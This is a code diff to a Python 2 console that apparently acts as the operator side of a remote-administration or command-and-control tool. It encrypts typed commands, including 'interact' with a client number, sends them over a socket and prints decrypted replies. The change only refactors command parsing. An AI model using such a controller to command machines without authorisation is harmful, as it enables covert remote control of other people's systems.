@@ -7,6 +7,7 @@ import os
 import sys
 import time
 from socket import *
+import StringIO
 
 from controlApi import *
 from encryption import *
@@ -36,22 +37,19 @@ class control():
 					else: os.system("clear")
 				elif(command == "help"):
 					print config["allcommands"]
-				elif("interact" in command):
-					answers = command.split(' ')
-					if len(answers) == 1:
-						client = raw_input(" [?] Client Number:")
-						Cmd = {"status":"OK", "command": command, "client":client}
-					else: Cmd = {"status":"OK", "command": answers[0], "client":answers[1]} 
 				else:
-					Cmd = {"status":"OK", "command": command}
-				Cmd = Encode().process(Cmd)
-				Cmd = encryption().encrypt(Cmd, config["password"])
-				s.send(Cmd)
-				reply = s.recv(20480)
-				reply = encryption().decrypt(reply, config["password"])
-				print "Reply: " + str(reply)
-				Reply = Api().main(reply)
-				print str(Reply)
+					answers = command.split(' ')
+					if answers[0] == "interact" and len(answers) == 2:
+						Cmd = {"status":"OK", "command": answers[0], "client":str(answers[1])}
+					else: Cmd = {"status":"OK", "command": answers[0]}
+					Cmd = Encode().process(Cmd)
+					Cmd = encryption().encrypt(Cmd, config["password"])
+					s.send(Cmd)
+					reply = s.recv(20480)
+					reply = encryption().decrypt(reply, config["password"])
+					print "Reply: " + str(reply)
+					Reply = Api().main(reply)
+					print str(Reply)
 
 			except KeyboardInterrupt:
 				try:
